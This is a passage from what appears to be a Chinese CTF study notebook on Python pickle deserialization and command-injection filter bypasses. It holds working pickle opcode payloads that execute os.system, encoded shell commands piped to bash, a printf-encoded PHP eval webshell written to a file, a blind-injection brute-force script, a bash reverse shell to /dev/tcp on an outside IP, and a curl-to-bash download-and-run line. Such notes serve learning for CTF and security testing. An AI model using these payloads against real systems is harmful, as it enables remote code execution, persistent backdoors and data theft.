  File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 69, in <module>
    p2 = pickle.loads(data)
TypeError: __new__() missing 2 required positional arguments: 'x' and 'y'
'''
```

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

  # def __getnewargs__(self):
      # return (self.x, self.y)

    def __new__(cls, args):
        print("__new()__  ->  " + repr(args))
        return super().__new__(cls)

    def __repr__(self):
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1)

# 序列化对象
data = pickle.dumps(p1)

# 反序列化对象
p2 = pickle.loads(data)
print(p2)

'''
__new()__  ->  (1, 2)
Point(1, 2)
__new()__  ->  ()
Point(1, 2)
'''
```

>##### `__getnewargs_ex__()`
>
>限制：
>
>1. 对于使用 v2 版或更高版协议的 pickle 才能使用此方法
>2. 必须返回一对 `(args, kwargs)` 用于构建对象，其中 `args` 是表示位置参数的 tuple，而 `kwargs` 是表示命名参数的 dict
>
>`__getnewargs_ex__()` 方法 return 的值，会在解封时传给 `__new__()` 方法的作为它的参数。
>
>##### `__getnewargs__()`
>
>限制：
>
>1. 必须返回一个 tuple 类型的 `args`
>2. 如果定义了 `__getnewargs_ex__()`，那么 `__getnewargs__()` 就不会被调用。
>
>这个方法与上一个 `__getnewargs_ex__()` 方法类似，但只支持位置参数。
>
>注：在 Python 3.6 前，v2、v3 版协议会调用 `__getnewargs__()`，更高版本协议会调用 `__getnewargs_ex__()`

### 构造反序列化payload

>https://github.com/Macr0phag3/souse
>
>#### 注意事项
>
>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
>
>```
># linux(注意posix):
>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>
># windows(注意nt):
>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>```

#### 全局引入

```python
import secret

class Target:
    def __init__(self):
        obj = pickle.loads(ser)  # 输入点
        if obj.pwd == secret.pwd:
            print("Hello, admin!")
```

exp

```python
import pickle
import pickletools

class secret:
    pwd = "???"

class Target:
    def __init__(self):
        self.pwd = secret.pwd

test = Target()

serialized = pickletools.optimize(pickle.dumps(test, protocol=3))
print(serialized)
pickletools.dis(serialized)
'''
结果
b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdX\x03\x00\x00\x00???sb.'

payload
b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'
'''

pickletools.dis(pickletools.optimize(b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'))
print('pickle pwd -> ' + pickle.loads(b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.').pwd)
```

```Python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2023/10/17 20:35
# @Author  : wi1111
# @File    : pickle_demo.py
# @Software: PyCharm python3.9
import pickle
import pickletools

"""
import secret

class Target:
    def __init__(self):
        obj = pickle.loads(ser)  # 输入点
        if obj.pwd == secret.pwd:
            print("Hello, admin!")
"""

class secret:
    pwd = "???"

class Target:
    def __init__(self):
        self.pwd = secret.pwd

test = Target()

serialized = pickletools.optimize(pickle.dumps(test, protocol=0))
print(serialized)
pickletools.dis(serialized)

# 结果
# b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.'

# payload
# b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.'
```

#### 引入魔术方法

```python
class Target:
    def __init__(self):
        ser = ""  # 输入点
        if "R" in ser:
            print("Hack! <=@_@")
        else:
            obj = pickle.loads(ser)
```

先看常规payload

```python
class exp_demo:

    def __reduce__(self):
        import os
        return os.system, ('whoami', )
print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
# 常规： b'cnt\nsystem\n(Vwhoami\ntR.'
```

对于这个例子来说，要想 RCE，需要过这里的 if，也就是不能用 `R`。

这 R 如何去除呢？`b` 就派上用场了。

```Python
class exp_demo:

    def __init__(self):
        import os
        self.__setstate__ = os.system

    # def __reduce__(self):
    #     import os
    #     return os.system, ('whoami', )

print('2————————————————————————————————————————————————————————————————————————')
print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
# 常规： b'cnt\nsystem\n(Vwhoami\ntR.'
# 自动生成paylaod：b'ccopy_reg\n_reconstructor\n(c__main__\nexp_demo\nc__builtin__\nobject\nNtR(dV__setstate__\ncnt\nsystem\nsb.'
# payload：b'ccopy_reg\n_reconstructor\n(c__main__\nexp_demo\nc__builtin__\nobject\nNtR(dV__setstate__\ncnt\nsystem\nsbVwhoami\nb.'

# 你会发现里面还是存在R用于构建实例，这时候就要更换版本，利用\x81来创建实例
# \x81 其实就是通过 cls.__new__ 来创建一个实例，需要栈顶有 args（元组） 和 kwds（字典）。
print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=3)))
pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=3)))
"""
b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsb.'
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ exp_demo'
   21: )    EMPTY_TUPLE
   22: \x81 NEWOBJ
   23: }    EMPTY_DICT
   24: X    BINUNICODE '__setstate__'
   41: c    GLOBAL     'nt system'
   52: s    SETITEM
   53: b    BUILD
   54: .    STOP
highest protocol among opcodes = 2

payload：b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbVwhoami\nb.'
"""
```

回顾一下它的作用：使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性/方法的设置。既然可以设置实例的方法，那么能不能设置一个方法让它在反序列化的时候自动运行呢？什么方法会在反序列化的时候自动运行，答案是上面提到的 `__setstate__()`。

所以，我们只需要令 `__setstate__ = os.system`，再把参数传入即可：

```
b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbVwhoami\nb.'
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ exp_demo'
   21: )    EMPTY_TUPLE
   22: \x81 NEWOBJ
   23: }    EMPTY_DICT
   24: X    BINUNICODE '__setstate__'
   41: c    GLOBAL     'nt system'
   52: s    SETITEM
   53: b    BUILD
   54: V    UNICODE    'whoami'
   62: b    BUILD
   63: .    STOP
highest protocol among opcodes = 2
修改步骤就是在自动生成的payload上第一次b构建完成后，此时__setstate__已经不再是None，只需再次构建传进参数即可调用到__setstate__。
```

![image-20231018002948755](daydayup.assets/image-20231018002948755.png)

>### BINUNICODE操作码
>
>BINUNICODE = b'X' 这个操作码的含义是将一个Unicode字符串压入pickle的数据栈中，这个Unicode字符串是一个以UTF-8编码的字符串。
>
>"counted UTF-8 string argument"指的是：这个操作码后面跟着的数据是一个计数的UTF-8字符串，即首先有一个整数表示字符串的长度，然后是实际的字符串数据。这种格式可以让pickle知道在读取字符串时应读取多少字节。
>
>至于如何触发这个操作码，当你尝试pickle一个包含Unicode字符串的Python对象时，这个操作码就会被触发。例如：
>
>```python
>import pickle
>
>data = {'key': '这是一个Unicode字符串'}
>pickle.dumps(data)
>```
>
>在这个例子中，当pickle模块尝试序列化这个字典时，会使用BINUNICODE操作码来处理值为Unicode字符串的部分。
>
>所以可以看到`V`需要最后使用`\n`来分割，而`X`因为有前四个字节表示字符串长度，所以无需在最后使用`\n`来分割。
>![image-20231018004135499](daydayup.assets/image-20231018004135499.png)
>
>`BINUNICODE`操作码在Python的pickle协议中用于表示长度为4字节的Unicode字符串。这意味着它可以表示长度为2^32-1的字符串。如果字符串长度超出这个范围，那么pickle模块会使用不同的操作码来处理这种情况。
>
>在Python的pickle协议中，有一个叫做`BINUNICODE8`的操作码，这个操作码用于处理长度超过4字节的Unicode字符串。`BINUNICODE8`操作码可以处理长度为2^64-1的字符串，这个长度远远超过了大多数实际使用情况的需求。
>
>所以，如果你尝试pickle一个长度超过`BINUNICODE`可以表示的字符串，Python的pickle模块会自动使用`BINUNICODE8`操作码来处理这种情况，你不需要手动进行任何操作。

####  变量与方法覆盖

```python
PWD = "???"  # 已打码

class Target2_test:
    PWD_TEST = 111

class Target:
    def __init__(self):
        obj = pickle.loads(ser)  # 输入点
        if obj.pwd == PWD:
            print("Hello, admin!")
            
            
# import builtins
# builtins.globals()["PWD"] = ""  # 先把 PWD 改成一个值
# obj.pwd = ""  # 再让 obj.pwd 也等于这个值
# print(__import__('builtins').globals())

# payload: b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
payload2 = b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
print(payload2)
pickletools.dis(payload2)
Target2(payload2)
"""
b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
    0: \x80 PROTO      3
    2: c    GLOBAL     'builtins globals'
   20: )    EMPTY_TUPLE
   21: R    REDUCE
   22: (    MARK
   23: V        UNICODE    'PWD'
   28: V        UNICODE    'wi1'
   33: u        SETITEMS   (MARK at 22)
   34: 0    POP
   35: c    GLOBAL     '__main__ Target2'
   53: )    EMPTY_TUPLE
   54: \x81 NEWOBJ
   55: }    EMPTY_DICT
   56: (    MARK
   57: V        UNICODE    'pwd'
   62: V        UNICODE    'wi1'
   67: u        SETITEMS   (MARK at 56)
   68: b    BUILD
   69: .    STOP
highest protocol among opcodes = 2
"""


# 获取到 Target2_test 类的内部的值，利用i
# payload: b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'
print(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')
pickletools.dis(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')


print(pickle.loads(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'))
"""
b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'
    0: (    MARK
    1: c        GLOBAL     '__main__ Target2_test'
   24: V        UNICODE    'PWD_TEST'
   34: i        INST       'builtins getattr' (MARK at 0)
   52: .    STOP
highest protocol among opcodes = 0
"""
```

通过`import builtins`，利用其中的`globals`覆盖`PWD`，然后再用`0`弹出栈里的 `builtins.globals()` ，因为`builtins.globals()`是一个字典没有办法利用`.`来获取值也就是没有`__getattribute__`方法，所以再压入一个`Target2`实例，然后利用`\x81`来实例化对象，再用`b`给其附上属性`pwd`的值，就完成了覆盖

如果要获取一个对象或者类的属性，可以使用`i`来获取，通过调用内置方法中的`getattr`来获取到某个对象或者类中的属性。

当然，方法也是可以进行覆盖的

>### `sys.modules`
>
>`sys.modules` 是一个 Python 内置模块 `sys` 中的字典，它保存了当前解释器中已经导入的所有模块的引用。
>
>当你在 Python 中导入一个模块时，解释器会在 `sys.modules` 中查找该模块的引用。如果模块已经存在于 `sys.modules` 中，解释器会直接使用该引用，而不会重新加载模块。这样可以避免多次导入同一个模块，提高了导入的效率。
>
>`sys.modules` 中的模块引用是动态更新的。当你导入新的模块或重新加载模块时，`sys.modules` 会相应地更新。
>
>`sys.modules` 的键是模块的名称，值是对应模块的引用。你可以使用 `sys.modules` 来查看当前解释器中已经导入的模块。
>
>### `builtins.globals`
>
>`builtins.globals` 是一个内置模块 `builtins` 下的字典，它保存了当前作用域中的全局变量和函数的引用。
>
>`builtins` 模块是 Python 解释器在启动时自动导入的模块，它包含了一些内置的函数、异常和对象。`builtins.globals` 是 `builtins` 模块中的一个字典，它提供了对当前全局命名空间中的对象的访问。
>
>通过 `builtins.globals`，你可以获取当前作用域中定义的全局变量和函数的引用。这些引用被存储在 `builtins.globals` 字典中，以变量名作为键，以对应的对象作为值。
>
>需要注意的是，`builtins.globals` 提供了对全局作用域中的对象的访问，而不是所有作用域中的对象。如果你在一个函数内部调用 `builtins.globals`，它将返回该函数所在的作用域中的全局对象。

```Python
import sys
p0 = sys.modules
p0["sys"] = p0
import sys
p0["sys"] = sys.get("os")
```

用 `dir()` 来查看属性和方法，其实它在参数不同的时候，查询的逻辑是不一样的：

[![img](daydayup.assets/98a6e69c-927e-4960-ae87-e92636533d13.png)]()

另外特别注意的是，有些对象的 `__dict__` 属于 `mappingproxy` 类型，例如类对象和类实例，如果直接用 `b` 对`mappingproxy` 类型进行属性修改的话，会抛出异常

```python
try:
    Target2.__dict__['A'] = 1
except:
    traceback.print_exc()
    '''
    Traceback (most recent call last):
      File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 85, in <module>
        Target2.__dict__['A'] = 1
    TypeError: 'mappingproxy' object does not support item assignment
    '''
```

![image-20231018214724999](daydayup.assets/image-20231018214724999.png)

![image-20231018215123724](daydayup.assets/image-20231018215123724.png)

再看源码，如果 `state` 是两个元素的元组，那么会执行 `state, slotstate = state`，如果此时 `state in [None, {}]`（由于 `_pickle` 逻辑问题，是没办法让 state 等于 `''`、`0` 等这种值的），那么就会跑去执行 `setattr(inst, k, v)`，这是 mappingproxy 类型允许的

所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 `cA\nb\n}Va\nI1\nsb.` 应该改为 `cA\nb\n(N}Va\nI1\ntsb.` 或者 `cA\nb\n(}}Va\nI1\ntsb.`

>#### 拼接opcode
>
>将第一个pickle流结尾表示结束的 `.` 去掉，将第二个pickle流与第一个拼接起来即可。
>
>#### 全局变量覆盖
>
>python源码：
>
>```
># secret.py
>name='TEST3213qkfsmfo'
># main.py
>import pickle
>import secret
>
>opcode='''c__main__
>secret
>(S'name'
>S'1'
>db.'''
>
>print('before:',secret.name)
>
>output=pickle.loads(opcode.encode())
>
>print('output:',output)
>print('after:',secret.name)
>```
>
>首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：
>
>```
>opcode='''c__main__
>secret
>(S'name'
>S'1'
>db.'''
>```
>
>#### 函数执行
>
>与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：
>
>1. `R` ：
>
>```
>b'''cos
>system
>(S'whoami'
>tR.'''
>```
>
>1. `i` ：
>
>```
>b'''(S'whoami'
>ios
>system
>.'''
>```
>
>1. `o` ：
>
>```
>b'''(cos
>system
>S'whoami'
>o.'''
>```
>
>#### 实例化对象
>
>实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：
>
>```
>class Student:
>    def __init__(self, name, age):
>        self.name = name
>        self.age = age
>
>data=b'''c__main__
>Student
>(S'XiaoMing'
>S"20"
>tR.'''
>
>a=pickle.loads(data)
>print(a.name,a.age)
>```
>
>#### pker的使用（推荐）
>
>- pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)。
>- 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
>
>#### 注意事项
>
>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
>
>```
># linux(注意posix):
>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>
># windows(注意nt):
>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>```
>
>### pker能做的事
>
>引用自https://xz.aliyun.com/t/7012#toc-5：
>
>> - 变量赋值：存到memo中，保存memo下标和变量名即可
>> - 函数调用
>> - 类型字面量构造
>> - list和dict成员修改
>> - 对象成员变量修改
>
>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。
>
>### 使用方法与示例
>
>1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
>2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
>3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：
>
>```
>以下module都可以是包含`.`的子module
>调用函数时，注意传入的参数类型要和示例一致
>对应的opcode会被生成，但并不与pker代码相互等价
>
>GLOBAL
>对应opcode：b'c'
>获取module下的一个全局对象（没有import的也可以，比如下面的os）：
>GLOBAL('os', 'system')
>输入：module,instance(callable、module都是instance)  
>
>INST
>对应opcode：b'i'
>建立并入栈一个对象（可以执行一个函数）：
>INST('os', 'system', 'ls')  
>输入：module,callable,para 
>
>OBJ
>对应opcode：b'o'
>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
>OBJ(GLOBAL('os', 'system'), 'ls') 
>输入：callable,para
>
>xxx(xx,...)
>对应opcode：b'R'
>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
>
>li[0]=321
>或
>globals_dic['local_var']='hello'
>对应opcode：b's'
>更新列表或字典的某项的值
>
>xx.attr=123
>对应opcode：b'b'
>对xx对象进行属性设置
>
>return
>对应opcode：b'0'
>出栈（作为pickle.loads函数的返回值）：
>return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
>```
>
>注意：
>
>1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
>2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:
>
>```
>test="123"
>return test
>```
>
>被解析为：
>
>```
>b"S'123'\np0\n0g0\n."
>```
>
>#### pker：全局变量覆盖
>
>- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：
>
>```
>secret=GLOBAL('__main__', 'secret') 
># python的执行文件被解析为__main__对象，secret在该对象从属下
>secret.name='1'
>secret.category='2'
>```
>
>- 覆盖引入模块的变量：
>
>```
>game = GLOBAL('guess_game', 'game')
>game.curr_ticket = '123'
>```
>
>接下来会给出一些具体的基本操作的实例。
>
>#### pker：函数执行
>
>- 通过`b'R'`调用：
>
>```
>s='whoami'
>system = GLOBAL('os', 'system')
>system(s) # `b'R'`调用
>return
>```
>
>- 通过`b'i'`调用：
>
>```
>INST('os', 'system', 'whoami')
>```
>
>- 通过`b'c'`与`b'o'`调用：
>
>```
>OBJ(GLOBAL('os', 'system'), 'whoami')
>```
>
>- 多参数调用函数
>
>```
>INST('[module]', '[callable]'[, par0,par1...])
>OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
>```
>
>#### pker：实例化对象
>
>- 实例化对象是一种特殊的函数执行
>
>```
>animal = INST('__main__', 'Animal','1','2')
>return animal
>
>
># 或者
>
>animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
>return animal
>```
>
>- 其中，python原文件中包含：
>
>```
>class Animal:
>
>    def __init__(self, name, category):
>        self.name = name
>        self.category = category
>```
>
>- 也可以先实例化再赋值：
>
>```
>animal = INST('__main__', 'Animal')
>animal.name='1'
>animal.category='2'
>return animal
>```
>
>#### 手动辅助
>
>- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
>- 建立普通的类时，可以先pickle.dumps，再拼接至payload。
>
>#### [Macr0phag3/souse: A tool for converting Python source code to opcode(pickle) (github.com)](https://github.com/Macr0phag3/souse)

## Python 原型链污染



## 命令执行绕过

![命令执行绕过](daydayup.assets/命令执行绕过.jpg)

#### 空格

```
#常见的绕过符号有：
$IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、
kg=$'\x20flag.txt'&&cat$kg
# $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用
set |grep IFS
IFS=$' \t\n'

<：输入重定向，后面需要接目录或者文件名，例如ls<./，所以不是所有的命令都可以使用它作为空格替代符，例如ping
<>：打开一个文件作为输入与输出使用。所以它比<的限制更严格，后面必须是文件，连目录都不行
%09：url 编码的制表符的。
%0a：url 编码的换行符。
```

#### 命令分隔符

```
%0a  #换行符，需要php环境
%0d  #回车符，需要php环境
%09  #TAB
%00	 #url 编码的 NULL，高版本（>=5.4.38）PHP 的 exec、system、passthru 都会拦截
;    #在 shell 中，是”连续指令”，不论;前面的命令执行成功与否都会执行后面的命令
&    #& 放在启动参数后面表示设置此进程为后台进程，这里可以巧妙地作为命令分隔符：ls&whoami实际上相当于 ls &; whoami，即将ls放到后台运行，结束后再运行 whoami。不管第一条命令成功与否，都会执行第二条命令
&&   #第一条命令成功，第二条才会执行
|    #第一条命令的结果，作为第二条命令的输入
||   #第一条命令失败，第二条才会执行
```

利用`{}`

花括号扩展本来的作用是组合，看下面的例子，a、b 都是候选字符，输出的结果是候选的组合。我们可以看到，中间多了一个空格。所以就可以这样利用

```bash
soyamilk@DESKTOP-13QDS1A:~$ echo {a,b}
a b
soyamilk@DESKTOP-13QDS1A:~$ echo ab{a,b}ccc
abaccc abbccc
soyamilk@DESKTOP-13QDS1A:~$ {a,b}
a: command not found
soyamilk@DESKTOP-13QDS1A:~$ {ls,.}
a  b  flag
soyamilk@DESKTOP-13QDS1A:~$ {cat,./flag}
flag{abc}
```

需要多个参数也是可以的，加多个`,`就行：`{ls,-al,./}`，不过需要注意，使用花括号扩展的时候，`{}`中不能有空格。

```
soyamilk@DESKTOP-13QDS1A:~$ {ls,-al,./}
total 24
drwxr-xr-x 1 soyamilk soyamilk 4096 Oct 16 16:31 .
drwxr-xr-x 1 root     root     4096 Jul 12 11:20 ..
-rw------- 1 soyamilk soyamilk 1617 Oct 16 18:07 .bash_history
-rw-r--r-- 1 soyamilk soyamilk  220 Jul 12 11:20 .bash_logout
-rw-r--r-- 1 soyamilk soyamilk 3771 Jul 12 11:20 .bashrc
drwxr-xr-x 1 soyamilk soyamilk 4096 Jul 12 11:20 .landscape
-rw-r--r-- 1 soyamilk soyamilk    0 Nov 23 15:16 .motd_shown
-rw-r--r-- 1 soyamilk soyamilk  807 Jul 12 11:20 .profile
-rw-r--r-- 1 soyamilk soyamilk    0 Sep 19 21:29 .sudo_as_admin_successful
-rw------- 1 soyamilk soyamilk 8273 Oct 16 16:30 .viminfo
-rw-r--r-- 1 soyamilk soyamilk   15 Oct 16 16:31 a
-rw-r--r-- 1 soyamilk soyamilk    0 Oct 16 16:31 b
-rw-r--r-- 1 soyamilk soyamilk   10 Oct 16 16:32 flag
```



#### 关键字

**能够进行查看的命令**

```
过滤系统命令关键字——换用关键字平替：
Linux中与cat类似的读取打开文件命令
nl：读取显示文件内容的时候，顺便标上行号
tac：从最后一行开始读取显示文件内容，容易发现tac是cat的倒序，即它俩在读取文件内容时顺序相反
more：一页一页的显示档案内容
less：与more类似
head：查看前几行（头部）
tail：查看后几行（尾部）
od：以二进制的方式读取档案内容
vi：一种编辑器，这个也可以查看
vim：一种编辑器，这个也可以查看
sort：可以查看
uniq: 可以查看
base64
```

- 拼接绕过

  ```
  #执行ls命令：
  a=l;b=s;$a$b
  #cat flag文件内容：
  a=c;b=at;c=f;d=lag;$a$b ${c}${d}
  #cat test文件内容
  a="ccaatt";b=${a:0:1}${a:2:1}${a:4:1};$b test
  ```

- 编码绕过

  ```
  #base64
  echo "Y2F0IC9mbGFn"|base64 -d|bash  ==> cat /flag
  echo Y2F0IC9mbGFn|base64 -d|sh      ==> cat /flag
  #hex
  echo "0x636174202f666c6167" | xxd -r -p|bash   ==> cat /flag
  
  $(printf "\154\163") ==>ls
  $(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
  {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
  #i也可以通过这种方式写马
  #内容为<?php @eval($_POST['c']);?>
  ${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
  ```

- 单引号和双引号绕过

  ```
  c'a't /flag
  c"a"t /flag
  ```

- 反斜杠绕过

  ```
  ca\t /flag
  ```

- 通过$PATH绕过

  ```
  #echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成
  #当执行程序时，shell自动跟据PATH变量的值去搜索该程序
  #shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索
  echo $PATH 
  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  `echo $PATH| cut -c 8,9`t test
  $(echo $PATH| cut -c 8,9)t flag
  
  反引号和$()都起命令替换作用
  ```

- 通配符绕过

  >1. […]表示匹配方括号之中的任意一个字符
  >
  >2. {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。
  >
  >3. {…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开
  >
  > ```
  >soyamilk@DESKTOP-13QDS1A:~$ cat fl[a,b,c]a
  >cat: 'fl[a,b,c]a': No such file or directory
  >soyamilk@DESKTOP-13QDS1A:~$ cat fl[a,b,c]g
  >flag{abc}
  >soyamilk@DESKTOP-13QDS1A:~$ cat fl{a,b,c}g
  >flag{abc}
  >cat: flbg: No such file or directory
  >cat: flcg: No such file or directory
  > ```
  >
  >
  >
  >
  >
  >1. `*`（星号）：匹配任意长度的任意字符。
  >
  >- 例如：`*.txt` 匹配所有以 `.txt` 结尾的文件名。
  >
  >2. `?`（问号）：匹配任意单个字符。
  >
  >- 例如：`file?.txt` 匹配类似 `file1.txt`、`fileA.txt` 等文件名。
  >
  >3. `[characters]`：匹配字符集中的任意一个字符。
  >
  >- 例如：`file[0-9].txt` 匹配类似 `file1.txt`、`file5.txt` 等文件名。
  >
  >4. `[!characters]` 或 `[^characters]`：匹配不在字符集中的任意一个字符。
  >
  >- 例如：`file[!0-9].txt` 匹配不以数字结尾的文件名。
  >
  >5. `{pattern1,pattern2,...}`：匹配指定的模式。
  >
  >- 例如：`{file1,file2}.txt` 匹配 `file1.txt` 和 `file2.txt`。
  >
  >6. `()`：用于创建子模式，通常与其他通配符结合使用。
  >
  >- 例如：`file{1,2}.txt` 与 `{file1,file2}.txt` 等效。
  >
  >7. `\`：用于转义特殊字符，让其失去其特殊含义。
  >
  >- 例如：`file\?.txt` 匹配 `file?.txt` 文件。

  ```
  cat t?st
  cat te*
  cat t[a-z]st
  cat t{a,b,c,d,e,f}st
  ```

- 利用`空`绕过

  Bash 很多东西都是`空`，例如`''`、不存在的变量等等，就可以利用他们来隔开命令

  ```
  l''s：l''s == ls
  
  "l""s"或者'l''s'或者'l'"s"或者l"s"...
  
  l${anything}s：因为anything不存在，是空的，所以l${anything}s == ls，与l''s原理一样。
  
  l$1s、l$2s、...、l$9s：相比上面那个，这个方法不用{}也可以，因为这类数字名变量的名称界定比较特殊。至于它们是什么意思：
  $0: Shell 本身，所以这里有个技巧是 {printf,"\167\150\157\141\155\151"} | $0
  $1~$n: Shell 的各参数值。$1 是第 1 个参数、$2 是第 2 个参数，以此类推。
  
  l$*s、l$@s：它们都表示所有 Shell 参数的列表，不包括脚本本身（即 $1 - $n）。但是还是有区别的。举例：执行 test.sh 1 2 3时，"$*"表示"1 2 3"，而"$@"表示"1" "2" "3"。二者没有被引号引起来时是一样的都为"1 2 3"，只有当被引号引起来后才不一样。
  
  l$!s：$!代表 Shell 最后运行的后台 Process 的 PID。可以简单地理解为，例如一个命令放到后台运行：ping baidu.com & 后它的 PID，没有放到后台的命令那就是空。
  
  c$()at key：$()代表执行一个空的命令，返回值也为空。当然这样也是可以的：l$(echo s)。
  l``s：这样当然也可以了。
  ```

  >`$0$1$2$3...`举例
  >
  >```
  >soyamilk@DESKTOP-13QDS1A:~$ cat test01.sh
  >echo $0
  >echo $1
  >echo $2
  >soyamilk@DESKTOP-13QDS1A:~$ . test01.sh Hello World!
  >-bash
  >Hello
  >World!
  >soyamilk@DESKTOP-13QDS1A:~$
  >```
  >
  >

### 无回显RCE

1. 重定向写文件

   >`ls | xargs sed -i "s/die/echo/"`
   >把die 替换成 echo
   >`ls | xargs sed -i "s/exec/system/"`
   >把exec 替换成 system

   2023 hectf EZphp

2. 反弹shell

   ```
   bash -c 'bash -i >& /dev/tcp/123.123.123.123/1234 0>&1'
   ```

3. 盲注

   需要盲注的情况：

   ```php
   <?php
   highlight_file(__FILE__);
   
   exec($_GET['cmd'],$output,$return_val);
   if(!$return_val)echo "success";
   else echo "fail";
   ```

   可以依据判据通过：

   ```
   if [ $(cut -c 1 /flag) = U ];then ls;else abcd;fi
   ```

   来逐位爆破`/flag`文件的内容。

   盲注脚本：

   ```python
   import requests
   flag=''
   for i in range(1,100):
       for j in '}{-abcdefghijklmnopqrstuvwxyz0123456789`':
           url=f'http://localhost/?cmd=if [ $(cut -c {i} /f???) = {j} ]%0Athen ls%0Aelse abcd%0Afi'
           print(url)
           R=requests.get(url)
           R.encoding='utf-8'
           if 'success' in R.text:
               flag+=j
               break
           if j=='`':
               break
   print(flag)
   ```


![img](daydayup.assets/1999159-20201002223158950-1419102854.png)

## 反弹shell

```
curl 192.168.159.128:5478|bash
```



## JWT漏洞



## JS原型链污染

### 继承和原型链

